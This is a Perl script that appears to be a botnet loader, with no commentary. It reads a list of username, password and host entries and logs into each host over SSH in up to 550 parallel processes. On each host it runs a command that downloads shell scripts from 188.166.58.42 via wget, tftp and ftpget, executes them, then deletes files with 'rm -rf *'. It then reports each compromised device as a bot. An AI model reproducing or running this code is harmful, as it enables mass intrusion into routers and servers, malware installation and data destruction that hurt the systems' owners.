#!/usr/bin/perl
use Net::SSH2; use Parallel::ForkManager;

$file = shift @ARGV;
open(fh, '<',$file) or die "Can't read file '$file' [$!]\n"; @newarray; while (<fh>){ @array = split(':',$_);
push(@newarray,@array);

}
my $pm = new Parallel::ForkManager(550); for (my $i=0; $i <
scalar(@newarray); $i+=3) {
        $pm->start and next;
        $a = $i;
        $b = $i+1;
        $c = $i+2;
        $ssh = Net::SSH2->new();
        if ($ssh->connect($newarray[$c])) {
                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                        $channel = $ssh->channel();
                        $channel->exec('cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.166.58.42/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 188.166.58.42 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 188.166.58.42; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 188.166.58.42 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *');
                        sleep 10;
                        $channel->close;
                        print "\e[31;1m[ROUTER]\e[36;1mConnected - Bot Connecting: ".$newarray[$c]."\n";
                } else {
                        print "Server Connected\n";
                }
        } else {
                print "Scanning Done\n";
        }
	$pm->finish;
}
$pm->wait_all_children;